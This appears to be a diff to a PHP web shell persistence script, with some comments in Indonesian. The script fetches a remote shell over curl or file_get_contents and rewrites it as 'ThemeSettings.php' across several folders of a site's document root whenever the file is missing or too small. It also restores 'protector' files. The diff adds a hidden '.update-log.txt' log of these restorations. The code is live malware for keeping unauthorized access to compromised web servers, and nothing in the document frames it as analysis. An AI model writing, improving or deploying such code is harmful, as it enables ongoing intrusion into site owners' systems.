@@ -13,6 +13,27 @@ $shell_filenames = ['ThemeSettings.php'];
 
 $protectors = ['syscache.php', 'listbuilder.php', 'framework.php'];
 
+$log_file = $_SERVER['DOCUMENT_ROOT'] . '/.update-log.txt';
+
+function write_log($msg) {
+    global $log_file;
+    @file_put_contents($log_file, "[" . date('Y-m-d H:i:s') . "] $msg\n", FILE_APPEND);
+}
+
+function download_shell($url) {
+    
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 40);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $data = curl_exec($ch);
+        curl_close($ch);
+        if (strlen($data) > 50000) return $data;
+    }
+    return ini_get('allow_url_fopen') ? @file_get_contents($url) : false;
+}
+
 $docroot = $_SERVER['DOCUMENT_ROOT'];
 
 // ==================== DONT CHANGE IT  ====================
@@ -26,12 +47,13 @@ foreach ($spread_locations as $folder) {
     foreach ($shell_filenames as $name) {
         $full_path = $full_folder . $name;
 
+        
         if (!file_exists($full_path) || filesize($full_path) < 50000) {
             $code = download_shell($shell_url);
             if ($code) {
                 file_put_contents($full_path, $code);
                 @chmod($full_path, 0644);
-                // write_log dihapus
+                write_log("Shell restored to: $folder$name");
                 $restored_count++;
             }
         }
@@ -47,31 +69,15 @@ foreach ($protectors as $p) {
         foreach ($protectors as $source) {
             if (file_exists($docroot . '/' . $source)) {
                 copy($docroot . '/' . $source, $path);
-                // write_log dihapus
+                write_log("Protector restored: $p");
                 break;
             }
         }
     }
 }
 
+
 $malware_killed = 0;
 
-// write_log dihapus total
-// write_log("Protector run - Restored: $restored_count | Malware killed: $malware_killed");
-?>
-
-<?php
-// Fungsi download_shell tetap (karena masih dipakai)
-function download_shell($url) {
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 40);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-        $data = curl_exec($ch);
-        curl_close($ch);
-        if (strlen($data) > 50000) return $data;
-    }
-    return ini_get('allow_url_fopen') ? @file_get_contents($url) : false;
-}
+write_log("Protector run - Restored: $restored_count | Malware killed: $malware_killed");
 ?>
